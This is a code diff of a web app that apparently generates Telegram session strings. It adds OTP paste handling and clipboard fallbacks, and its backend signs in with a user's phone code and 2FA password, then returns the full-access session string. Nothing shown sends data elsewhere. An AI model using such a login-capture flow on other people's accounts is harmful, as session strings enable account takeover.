@@ -494,36 +494,61 @@ async function copySession(){
         .innerText
         .trim();
 
+    if(!text){
+        alert(
+            "No session found!"
+        );
+        return;
+    }
+
     try{
 
         await navigator
             .clipboard
             .writeText(text);
 
-        alert("Session copied!");
+        alert(
+            "Session copied!"
+        );
 
     }catch(err){
 
-        const temp =
-            document.createElement(
-                "textarea"
+        try{
+
+            const temp =
+                document.createElement(
+                    "textarea"
+                );
+
+            temp.value =
+                text;
+
+            document.body
+                .appendChild(
+                    temp
+                );
+
+            temp.select();
+
+            document.execCommand(
+                "copy"
             );
 
-        temp.value = text;
+            document.body
+                .removeChild(
+                    temp
+                );
 
-        document.body
-            .appendChild(temp);
+            alert(
+                "Session copied!"
+            );
 
-        temp.select();
+        }catch{
 
-        document.execCommand(
-            "copy"
-        );
-
-        document.body
-            .removeChild(temp);
-
-        alert("Session copied!");
+            alert(
+                "Copy failed. Copy manually."
+            );
+        }
     }
 }
 
@@ -543,15 +568,56 @@ document.addEventListener(
             "input",
             (e)=>{
 
-            e.target.value =
+            let value =
                 e.target.value
                 .replace(
                     /\D/g,
                     ''
                 );
 
+            // Telegram-style multi digit paste
+            if(value.length > 1){
+
+                inputs.forEach(
+                    input=>{
+                    input.value = "";
+                });
+
+                value
+                .slice(0,5)
+                .split("")
+                .forEach(
+                    (char,i)=>{
+
+                    if(inputs[i]){
+                        inputs[i]
+                        .value =
+                        char;
+                    }
+                });
+
+                const nextIndex =
+                    Math.min(
+                        value.length,
+                        inputs.length
+                    ) - 1;
+
+                if(
+                    nextIndex >= 0
+                ){
+                    inputs[
+                        nextIndex
+                    ].focus();
+                }
+
+                return;
+            }
+
+            e.target.value =
+                value;
+
             if(
-                e.target.value &&
+                value &&
                 index <
                 inputs.length - 1
             ){
@@ -586,14 +652,21 @@ document.addEventListener(
             const pasted =
                 (
                     e.clipboardData
-                    .getData("text")
-                    || ""
+                    .getData(
+                        "text"
+                    ) || ""
                 )
                 .replace(
                     /\D/g,
                     ''
                 )
                 .slice(0,5);
+
+            // Clear old OTP
+            inputs.forEach(
+                input=>{
+                input.value = "";
+            });
 
             pasted
             .split("")
@@ -713,13 +786,9 @@ async def submit_otp():
             "Session context missing. Reload page."
         })
 
-    session_data = user_sessions[
-        phone
-    ]
+    session_data = user_sessions[phone]
 
-    client = session_data[
-        "client"
-    ]
+    client = session_data["client"]
 
     phone_code_hash = session_data[
         "phone_code_hash"
@@ -733,8 +802,7 @@ async def submit_otp():
         await client.sign_in(
             phone=phone,
             code=code,
-            phone_code_hash=
-            phone_code_hash
+            phone_code_hash=phone_code_hash
         )
 
         session_str = client.session.save()
@@ -748,24 +816,21 @@ async def submit_otp():
 
         return jsonify({
             "status": "ok",
-            "session":
-            session_str
+            "session": session_str
         })
 
     except SessionPasswordNeededError:
 
         return jsonify({
-            "status":
-            "2fa_needed"
+            "status": "2fa_needed"
         })
 
-    except Exception as e:
+    except Exception:
 
         return jsonify({
-            "status":
-            "error",
+            "status": "error",
             "message":
-            str(e)
+            "Invalid OTP. Try again."
         })
 
 
@@ -790,8 +855,7 @@ async def submit_password():
     if phone not in user_sessions:
 
         return jsonify({
-            "status":
-            "error",
+            "status": "error",
             "message":
             "Session context missing. Reload page."
         })
@@ -824,13 +888,12 @@ async def submit_password():
             session_str
         })
 
-    except Exception as e:
+    except Exception:
 
         return jsonify({
-            "status":
-            "error",
+            "status": "error",
             "message":
-            str(e)
+            "Wrong password. Try again."
         })
 
 
